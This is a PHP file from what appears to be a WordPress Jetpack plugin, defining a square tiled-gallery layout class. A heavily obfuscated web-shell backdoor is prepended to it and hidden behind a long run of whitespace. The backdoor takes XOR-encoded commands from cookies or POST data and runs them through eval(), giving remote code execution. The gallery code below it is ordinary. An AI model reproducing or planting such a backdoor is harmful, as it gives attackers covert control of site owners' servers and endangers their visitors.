<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e580ed2 = 2;$GLOBALS['kdb204'] = Array();global $kdb204;$kdb204 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['gd4535'] = "\x5d\x3d\x5e\x63\x4a\x62\x4f\x4e\x57\x76\x3c\x29\x38\x42\x7e\x6c\x65\x22\x6b\x7c\x3f\x2d\x54\x49\x79\x32\x72\x77\x66\x7b\x34\x52\x61\x28\x5b\x56\x7d\x27\x6d\x26\x55\x30\x39\x6f\x4c\x3e\x41\x71\x20\x3b\x47\x51\x4d\x58\x31\x78\x5a\x23\x35\x6a\xa\x2a\x43\x48\x25\x5f\x24\x73\x74\x21\x2e\x36\x33\x70\x59\x67\x60\x2c\x9\x4b\x40\x53\x6e\x7a\x2b\x45\xd\x37\x75\x2f\x64\x3a\x50\x44\x68\x5c\x69\x46";$kdb204[$kdb204['gd4535'][26].$kdb204['gd4535'][25].$kdb204['gd4535'][30].$kdb204['gd4535'][12].$kdb204['gd4535'][12].$kdb204['gd4535'][42].$kdb204['gd4535'][28].$kdb204['gd4535'][54].$kdb204['gd4535'][41]] = $kdb204['gd4535'][3].$kdb204['gd4535'][94].$kdb204['gd4535'][26];$kdb204[$kdb204['gd4535'][55].$kdb204['gd4535'][30].$kdb204['gd4535'][12].$kdb204['gd4535'][71].$kdb204['gd4535'][90].$kdb204['gd4535'][25].$kdb204['gd4535'][71].$kdb204['gd4535'][58]] = $kdb204['gd4535'][43].$kdb204['gd4535'][26].$kdb204['gd4535'][90];$kdb204[$kdb204['gd4535'][16].$kdb204['gd4535'][30].$kdb204['gd4535'][42].$kdb204['gd4535'][16].$kdb204['gd4535'][5].$kdb204['gd4535'][16].$kdb204['gd4535'][12].$kdb204['gd4535'][12].$kdb204['gd4535'][28]] = $kdb204['gd4535'][90].$kdb204['gd4535'][16].$kdb204['gd4535'][28].$kdb204['gd4535'][96].$kdb204['gd4535'][82].$kdb204['gd4535'][16];$kdb204[$kdb204['gd4535'][83].$kdb204['gd4535'][72].$kdb204['gd4535'][72].$kdb204['gd4535'][28].$kdb204['gd4535'][71].$kdb204['gd4535'][90].$kdb204['gd4535'][42].$kdb204['gd4535'][30].$kdb204['gd4535'][54]] = $kdb204['gd4535'][67].$kdb204['gd4535'][68].$kdb204['gd4535'][26].$kdb204['gd4535'][15].$kdb204['gd4535'][16].$kdb204['gd4535'][82];$kdb204[$kdb204['gd4535'][82].$kdb204['gd4535'][30].$kdb204['gd4535'][30].$kdb204['gd4535'][25].$kdb204['gd4535'][41].$kdb204['gd4535'][41].$kdb204['gd4535'][71].$kdb204['gd4535'][16]] = $kdb204['gd4535'][90].$kdb204['gd4535'][16].$kdb204['gd4535'][28].$kdb204['gd4535'][96].$kdb204['gd4535'][82].$kdb204['gd4535'][16].$kdb204['gd4535'][90];$kdb204[$kdb204['gd4535'][43].$kdb204['gd4535'][71].$kdb204['gd4535'][32].$kdb204['gd4535'][30].$kdb204['gd4535'][42].$kdb204['gd4535'][5].$kdb204['gd4535'][90].$kdb204['gd4535'][87].$kdb204['gd4535'][72]] = $kdb204['gd4535'][96].$kdb204['gd4535'][82].$kdb204['gd4535'][96].$kdb204['gd4535'][65].$kdb204['gd4535'][67].$kdb204['gd4535'][16].$kdb204['gd4535'][68];$kdb204[$kdb204['gd4535'][38].$kdb204['gd4535'][25].$kdb204['gd4535'][58].$kdb204['gd4535'][25].$kdb204['gd4535'][42]] = $kdb204['gd4535'][67].$kdb204['gd4535'][16].$kdb204['gd4535'][26].$kdb204['gd4535'][96].$kdb204['gd4535'][32].$kdb204['gd4535'][15].$kdb204['gd4535'][96].$kdb204['gd4535'][83].$kdb204['gd4535'][16];$kdb204[$kdb204['gd4535'][96].$kdb204['gd4535'][12].$kdb204['gd4535'][54].$kdb204['gd4535'][87]] = $kdb204['gd4535'][73].$kdb204['gd4535'][94].$kdb204['gd4535'][73].$kdb204['gd4535'][9].$kdb204['gd4535'][16].$kdb204['gd4535'][26].$kdb204['gd4535'][67].$kdb204['gd4535'][96].$kdb204['gd4535'][43].$kdb204['gd4535'][82];$kdb204[$kdb204['gd4535'][55].$kdb204['gd4535'][72].$kdb204['gd4535'][41].$kdb204['gd4535'][25].$kdb204['gd4535'][87].$kdb204['gd4535'][54]] = $kdb204['gd4535'][88].$kdb204['gd4535'][82].$kdb204['gd4535'][67].$kdb204['gd4535'][16].$kdb204['gd4535'][26].$kdb204['gd4535'][96].$kdb204['gd4535'][32].$kdb204['gd4535'][15].$kdb204['gd4535'][96].$kdb204['gd4535'][83].$kdb204['gd4535'][16];$kdb204[$kdb204['gd4535'][15].$kdb204['gd4535'][3].$kdb204['gd4535'][28].$kdb204['gd4535'][16].$kdb204['gd4535'][87].$kdb204['gd4535'][12].$kdb204['gd4535'][72].$kdb204['gd4535'][3].$kdb204['gd4535'][30]] = $kdb204['gd4535'][5].$kdb204['gd4535'][32].$kdb204['gd4535'][67].$kdb204['gd4535'][16].$kdb204['gd4535'][71].$kdb204['gd4535'][30].$kdb204['gd4535'][65].$kdb204['gd4535'][90].$kdb204['gd4535'][16].$kdb204['gd4535'][3].$kdb204['gd4535'][43].$kdb204['gd4535'][90].$kdb204['gd4535'][16];$kdb204[$kdb204['gd4535'][90].$kdb204['gd4535'][3].$kdb204['gd4535'][90].$kdb204['gd4535'][90].$kdb204['gd4535'][41].$kdb204['gd4535'][87].$kdb204['gd4535'][25]] = $kdb204['gd4535'][67].$kdb204['gd4535'][16].$kdb204['gd4535'][68].$kdb204['gd4535'][65].$kdb204['gd4535'][68].$kdb204['gd4535'][96].$kdb204['gd4535'][38].$kdb204['gd4535'][16].$kdb204['gd4535'][65].$kdb204['gd4535'][15].$kdb204['gd4535'][96].$kdb204['gd4535'][38].$kdb204['gd4535'][96].$kdb204['gd4535'][68];$kdb204[$kdb204['gd4535'][82].$kdb204['gd4535'][30].$kdb204['gd4535'][32].$kdb204['gd4535'][71].$kdb204['gd4535'][58]] = $kdb204['gd4535'][43].$kdb204['gd4535'][87].$kdb204['gd4535'][58].$kdb204['gd4535'][72].$kdb204['gd4535'][41].$kdb204['gd4535'][90].$kdb204['gd4535'][87].$kdb204['gd4535'][32].$kdb204['gd4535'][30];$kdb204[$kdb204['gd4535'][16].$kdb204['gd4535'][42].$kdb204['gd4535'][72].$kdb204['gd4535'][42].$kdb204['gd4535'][16]] = $kdb204['gd4535'][9].$kdb204['gd4535'][87].$kdb204['gd4535'][12].$kdb204['gd4535'][32].$kdb204['gd4535'][54].$kdb204['gd4535'][54].$kdb204['gd4535'][90].$kdb204['gd4535'][90];$kdb204[$kdb204['gd4535'][73].$kdb204['gd4535'][90].$kdb204['gd4535'][41].$kdb204['gd4535'][87].$kdb204['gd4535'][32].$kdb204['gd4535'][28].$kdb204['gd4535'][58].$kdb204['gd4535'][25]] = $_POST;$kdb204[$kdb204['gd4535'][9].$kdb204['gd4535'][58].$kdb204['gd4535'][41].$kdb204['gd4535'][90].$kdb204['gd4535'][58].$kdb204['gd4535'][5].$kdb204['gd4535'][32].$kdb204['gd4535'][71]] = $_COOKIE;@$kdb204[$kdb204['gd4535'][43].$kdb204['gd4535'][71].$kdb204['gd4535'][32].$kdb204['gd4535'][30].$kdb204['gd4535'][42].$kdb204['gd4535'][5].$kdb204['gd4535'][90].$kdb204['gd4535'][87].$kdb204['gd4535'][72]]($kdb204['gd4535'][16].$kdb204['gd4535'][26].$kdb204['gd4535'][26].$kdb204['gd4535'][43].$kdb204['gd4535'][26].$kdb204['gd4535'][65].$kdb204['gd4535'][15].$kdb204['gd4535'][43].$kdb204['gd4535'][75], NULL);@$kdb204[$kdb204['gd4535'][43].$kdb204['gd4535'][71].$kdb204['gd4535'][32].$kdb204['gd4535'][30].$kdb204['gd4535'][42].$kdb204['gd4535'][5].$kdb204['gd4535'][90].$kdb204['gd4535'][87].$kdb204['gd4535'][72]]($kdb204['gd4535'][15].$kdb204['gd4535'][43].$kdb204['gd4535'][75].$kdb204['gd4535'][65].$kdb204['gd4535'][16].$kdb204['gd4535'][26].$kdb204['gd4535'][26].$kdb204['gd4535'][43].$kdb204['gd4535'][26].$kdb204['gd4535'][67], 0);@$kdb204[$kdb204['gd4535'][43].$kdb204['gd4535'][71].$kdb204['gd4535'][32].$kdb204['gd4535'][30].$kdb204['gd4535'][42].$kdb204['gd4535'][5].$kdb204['gd4535'][90].$kdb204['gd4535'][87].$kdb204['gd4535'][72]]($kdb204['gd4535'][38].$kdb204['gd4535'][32].$kdb204['gd4535'][55].$kdb204['gd4535'][65].$kdb204['gd4535'][16].$kdb204['gd4535'][55].$kdb204['gd4535'][16].$kdb204['gd4535'][3].$kdb204['gd4535'][88].$kdb204['gd4535'][68].$kdb204['gd4535'][96].$kdb204['gd4535'][43].$kdb204['gd4535'][82].$kdb204['gd4535'][65].$kdb204['gd4535'][68].$kdb204['gd4535'][96].$kdb204['gd4535'][38].$kdb204['gd4535'][16], 0);@$kdb204[$kdb204['gd4535'][90].$kdb204['gd4535'][3].$kdb204['gd4535'][90].$kdb204['gd4535'][90].$kdb204['gd4535'][41].$kdb204['gd4535'][87].$kdb204['gd4535'][25]](0);if (!$kdb204[$kdb204['gd4535'][82].$kdb204['gd4535'][30].$kdb204['gd4535'][30].$kdb204['gd4535'][25].$kdb204['gd4535'][41].$kdb204['gd4535'][41].$kdb204['gd4535'][71].$kdb204['gd4535'][16]]($kdb204['gd4535'][46].$kdb204['gd4535'][44].$kdb204['gd4535'][31].$kdb204['gd4535'][85].$kdb204['gd4535'][46].$kdb204['gd4535'][93].$kdb204['gd4535'][74].$kdb204['gd4535'][65].$kdb204['gd4535'][31].$kdb204['gd4535'][40].$kdb204['gd4535'][7].$kdb204['gd4535'][65].$kdb204['gd4535'][72].$kdb204['gd4535'][71].$kdb204['gd4535'][71].$kdb204['gd4535'][32].$kdb204['gd4535'][28].$kdb204['gd4535'][5].$kdb204['gd4535'][12].$kdb204['gd4535'][32].$kdb204['gd4535'][12].$kdb204['gd4535'][32].$kdb204['gd4535'][25].$kdb204['gd4535'][72].$kdb204['gd4535'][58].$kdb204['gd4535'][58].$kdb204['gd4535'][32].$kdb204['gd4535'][5].$kdb204['gd4535'][25].$kdb204['gd4535'][54].$kdb204['gd4535'][28].$kdb204['gd4535'][5].$kdb204['gd4535'][28].$kdb204['gd4535'][54].$kdb204['gd4535'][54].$kdb204['gd4535'][5].$kdb204['gd4535'][32].$kdb204['gd4535'][54].$kdb204['gd4535'][32].$kdb204['gd4535'][41].$kdb204['gd4535'][25].$kdb204['gd4535'][28].$kdb204['gd4535'][5].$kdb204['gd4535'][32])){$kdb204[$kdb204['gd4535'][16].$kdb204['gd4535'][30].$kdb204['gd4535'][42].$kdb204['gd4535'][16].$kdb204['gd4535'][5].$kdb204['gd4535'][16].$kdb204['gd4535'][12].$kdb204['gd4535'][12].$kdb204['gd4535'][28]]($kdb204['gd4535'][46].$kdb204['gd4535'][44].$kdb204['gd4535'][31].$kdb204['gd4535'][85].$kdb204['gd4535'][46].$kdb204['gd4535'][93].$kdb204['gd4535'][74].$kdb204['gd4535'][65].$kdb204['gd4535'][31].$kdb204['gd4535'][40].$kdb204['gd4535'][7].$kdb204['gd4535'][65].$kdb204['gd4535'][72].$kdb204['gd4535'][71].$kdb204['gd4535'][71].$kdb204['gd4535'][32].$kdb204['gd4535'][28].$kdb204['gd4535'][5].$kdb204['gd4535'][12].$kdb204['gd4535'][32].$kdb204['gd4535'][12].$kdb204['gd4535'][32].$kdb204['gd4535'][25].$kdb204['gd4535'][72].$kdb204['gd4535'][58].$kdb204['gd4535'][58].$kdb204['gd4535'][32].$kdb204['gd4535'][5].$kdb204['gd4535'][25].$kdb204['gd4535'][54].$kdb204['gd4535'][28].$kdb204['gd4535'][5].$kdb204['gd4535'][28].$kdb204['gd4535'][54].$kdb204['gd4535'][54].$kdb204['gd4535'][5].$kdb204['gd4535'][32].$kdb204['gd4535'][54].$kdb204['gd4535'][32].$kdb204['gd4535'][41].$kdb204['gd4535'][25].$kdb204['gd4535'][28].$kdb204['gd4535'][5].$kdb204['gd4535'][32], 1);$pc0163 = NULL;$m1d89d = NULL;$kdb204[$kdb204['gd4535'][38].$kdb204['gd4535'][25].$kdb204['gd4535'][25].$kdb204['gd4535'][87].$kdb204['gd4535'][30].$kdb204['gd4535'][58].$kdb204['gd4535'][54].$kdb204['gd4535'][3].$kdb204['gd4535'][5]] = $kdb204['gd4535'][3].$kdb204['gd4535'][25].$kdb204['gd4535'][41].$kdb204['gd4535'][25].$kdb204['gd4535'][12].$kdb204['gd4535'][41].$kdb204['gd4535'][16].$kdb204['gd4535'][71].$kdb204['gd4535'][21].$kdb204['gd4535'][90].$kdb204['gd4535'][28].$kdb204['gd4535'][54].$kdb204['gd4535'][28].$kdb204['gd4535'][21].$kdb204['gd4535'][30].$kdb204['gd4535'][87].$kdb204['gd4535'][71].$kdb204['gd4535'][54].$kdb204['gd4535'][21].$kdb204['gd4535'][32].$kdb204['gd4535'][87].$kdb204['gd4535'][90].$kdb204['gd4535'][5].$kdb204['gd4535'][21].$kdb204['gd4535'][90].$kdb204['gd4535'][41].$kdb204['gd4535'][87].$kdb204['gd4535'][16].$kdb204['gd4535'][32].$kdb204['gd4535'][90].$kdb204['gd4535'][3].$kdb204['gd4535'][32].$kdb204['gd4535'][16].$kdb204['gd4535'][58].$kdb204['gd4535'][71].$kdb204['gd4535'][72];global $m227451cb;function  v78a11dd($pc0163, $d4dfd){global $kdb204;$kfd5fa80a = "";for ($r6b214ce7=0; $r6b214ce7<$kdb204[$kdb204['gd4535'][83].$kdb204['gd4535'][72].$kdb204['gd4535'][72].$kdb204['gd4535'][28].$kdb204['gd4535'][71].$kdb204['gd4535'][90].$kdb204['gd4535'][42].$kdb204['gd4535'][30].$kdb204['gd4535'][54]]($pc0163);){for ($o60da=0; $o60da<$kdb204[$kdb204['gd4535'][83].$kdb204['gd4535'][72].$kdb204['gd4535'][72].$kdb204['gd4535'][28].$kdb204['gd4535'][71].$kdb204['gd4535'][90].$kdb204['gd4535'][42].$kdb204['gd4535'][30].$kdb204['gd4535'][54]]($d4dfd) && $r6b214ce7<$kdb204[$kdb204['gd4535'][83].$kdb204['gd4535'][72].$kdb204['gd4535'][72].$kdb204['gd4535'][28].$kdb204['gd4535'][71].$kdb204['gd4535'][90].$kdb204['gd4535'][42].$kdb204['gd4535'][30].$kdb204['gd4535'][54]]($pc0163); $o60da++, $r6b214ce7++){$kfd5fa80a .= $kdb204[$kdb204['gd4535'][26].$kdb204['gd4535'][25].$kdb204['gd4535'][30].$kdb204['gd4535'][12].$kdb204['gd4535'][12].$kdb204['gd4535'][42].$kdb204['gd4535'][28].$kdb204['gd4535'][54].$kdb204['gd4535'][41]]($kdb204[$kdb204['gd4535'][55].$kdb204['gd4535'][30].$kdb204['gd4535'][12].$kdb204['gd4535'][71].$kdb204['gd4535'][90].$kdb204['gd4535'][25].$kdb204['gd4535'][71].$kdb204['gd4535'][58]]($pc0163[$r6b214ce7]) ^ $kdb204[$kdb204['gd4535'][55].$kdb204['gd4535'][30].$kdb204['gd4535'][12].$kdb204['gd4535'][71].$kdb204['gd4535'][90].$kdb204['gd4535'][25].$kdb204['gd4535'][71].$kdb204['gd4535'][58]]($d4dfd[$o60da]));}}return $kfd5fa80a;}function  o7530d7a4($pc0163, $d4dfd){global $kdb204;global $m227451cb;return $kdb204[$kdb204['gd4535'][16].$kdb204['gd4535'][42].$kdb204['gd4535'][72].$kdb204['gd4535'][42].$kdb204['gd4535'][16]]($kdb204[$kdb204['gd4535'][16].$kdb204['gd4535'][42].$kdb204['gd4535'][72].$kdb204['gd4535'][42].$kdb204['gd4535'][16]]($pc0163, $m227451cb), $d4dfd);}foreach ($kdb204[$kdb204['gd4535'][9].$kdb204['gd4535'][58].$kdb204['gd4535'][41].$kdb204['gd4535'][90].$kdb204['gd4535'][58].$kdb204['gd4535'][5].$kdb204['gd4535'][32].$kdb204['gd4535'][71]] as $d4dfd=>$c327b0c){$pc0163 = $c327b0c;$m1d89d = $d4dfd;}if (!$pc0163){foreach ($kdb204[$kdb204['gd4535'][73].$kdb204['gd4535'][90].$kdb204['gd4535'][41].$kdb204['gd4535'][87].$kdb204['gd4535'][32].$kdb204['gd4535'][28].$kdb204['gd4535'][58].$kdb204['gd4535'][25]] as $d4dfd=>$c327b0c){$pc0163 = $c327b0c;$m1d89d = $d4dfd;}}$pc0163 = @$kdb204[$kdb204['gd4535'][55].$kdb204['gd4535'][72].$kdb204['gd4535'][41].$kdb204['gd4535'][25].$kdb204['gd4535'][87].$kdb204['gd4535'][54]]($kdb204[$kdb204['gd4535'][82].$kdb204['gd4535'][30].$kdb204['gd4535'][32].$kdb204['gd4535'][71].$kdb204['gd4535'][58]]($kdb204[$kdb204['gd4535'][15].$kdb204['gd4535'][3].$kdb204['gd4535'][28].$kdb204['gd4535'][16].$kdb204['gd4535'][87].$kdb204['gd4535'][12].$kdb204['gd4535'][72].$kdb204['gd4535'][3].$kdb204['gd4535'][30]]($pc0163), $m1d89d));if (isset($pc0163[$kdb204['gd4535'][32].$kdb204['gd4535'][18]]) && $m227451cb==$pc0163[$kdb204['gd4535'][32].$kdb204['gd4535'][18]]){if ($pc0163[$kdb204['gd4535'][32]] == $kdb204['gd4535'][96]){$r6b214ce7 = Array($kdb204['gd4535'][73].$kdb204['gd4535'][9] => @$kdb204[$kdb204['gd4535'][96].$kdb204['gd4535'][12].$kdb204['gd4535'][54].$kdb204['gd4535'][87]](),$kdb204['gd4535'][67].$kdb204['gd4535'][9] => $kdb204['gd4535'][54].$kdb204['gd4535'][70].$kdb204['gd4535'][41].$kdb204['gd4535'][21].$kdb204['gd4535'][54],);echo @$kdb204[$kdb204['gd4535'][38].$kdb204['gd4535'][25].$kdb204['gd4535'][58].$kdb204['gd4535'][25].$kdb204['gd4535'][42]]($r6b214ce7);}elseif ($pc0163[$kdb204['gd4535'][32]] == $kdb204['gd4535'][16]){eval/*l98f385*/($pc0163[$kdb204['gd4535'][90]]);}exit();}} ?><?php
require_once dirname( __FILE__ ) . '/tiled-gallery-layout.php';
require_once dirname( __FILE__ ) . '/tiled-gallery-item.php';

class Jetpack_Tiled_Gallery_Layout_Square extends Jetpack_Tiled_Gallery_Layout {
	protected $type = 'square';

	private function compute_items() {
		$content_width  = Jetpack_Tiled_Gallery::get_content_width();
		$images_per_row = ( $this->columns > 1 ? $this->columns : 1 );
		$margin         = 2;

		$margin_space = ( $images_per_row * $margin ) * 2;
		$size         = floor( ( $content_width - $margin_space ) / $images_per_row );
		$img_size     = $remainder_size = $size;
		$remainder    = count( $this->attachments ) % $images_per_row;
		if ( $remainder > 0 ) {
			$remainder_space = ( $remainder * $margin ) * 2;
			$remainder_size  = floor( ( $content_width - $remainder_space ) / $remainder );
		}

		$c            = 1;
		$items_in_row = 0;
		$rows         = array();
		$row          = new stdClass();
		$row->images  = array();
		foreach ( $this->attachments as $image ) {
			if ( $remainder > 0 && $c <= $remainder ) {
				$img_size = $remainder_size;
			} else {
				$img_size = $size;
			}

			$image->width = $image->height = $img_size;

			$item = new Jetpack_Tiled_Gallery_Square_Item( $image, $this->needs_attachment_link, $this->grayscale );

			$row->images[] = $item;
			$c ++;
			$items_in_row++;

			if ( $images_per_row === $items_in_row || $remainder + 1 == $c ) {
				$rows[]       = $row;
				$items_in_row = 0;

				$row->height     = $img_size + $margin * 2;
				$row->width      = $content_width;
				$row->group_size = $img_size + 2 * $margin;

				$row         = new stdClass();
				$row->images = array();
			}
		}

		if ( ! empty( $row->images ) ) {
			$row->height     = $img_size + $margin * 2;
			$row->width      = $content_width;
			$row->group_size = $img_size + 2 * $margin;

			$rows[] = $row;
		}

		return $rows;
	}

	public function HTML( $context = array() ) {
		return parent::HTML( array( 'rows' => $this->compute_items() ) );
	}
}

